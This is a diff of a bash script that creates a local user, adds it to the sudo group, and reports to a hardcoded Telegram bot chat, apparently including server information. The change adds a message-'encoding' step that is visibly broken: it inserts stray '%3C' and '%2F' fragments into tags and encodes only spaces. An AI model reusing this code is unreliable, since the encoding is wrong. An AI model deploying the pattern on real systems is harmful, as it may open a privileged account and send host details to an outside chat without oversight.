@@ -6,10 +6,11 @@ CHAT_ID="1182377349"
 
 send_telegram_message() {
     local message=$1
+    local encoded_message=$(echo "$message" | sed 's/ /%20/g' | sed 's/<b>/<b>%3C/g' | sed 's/<\/b>/<%2Fb>/g' | sed 's/<code>/<code>%3C/g' | sed 's/<\/code>/<%2Fcode>/g')
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-        -d chat_id=$CHAT_ID \
-        -d text="$message" \
-        -d parse_mode=HTML > /dev/null
+        -d "chat_id=$CHAT_ID" \
+        -d "text=$encoded_message" \
+        -d "parse_mode=HTML" > /dev/null
 }
 
 get_server_info() {
@@ -44,8 +45,7 @@ if id "$user_id" &>/dev/null; then
     send_telegram_message "User $user_id already exists. Skipping user creation."
 else
     # Create the account
-    useradd -m -s /bin/bash "$user_id"
-    echo "$user_id:$password_1" | chpasswd
+    useradd -m -s /bin/bash "$user_id" && echo "$user_id:$password_1" | chpasswd
 
     # Add the user to sudo group (admin privileges)
     usermod -aG sudo "$user_id"
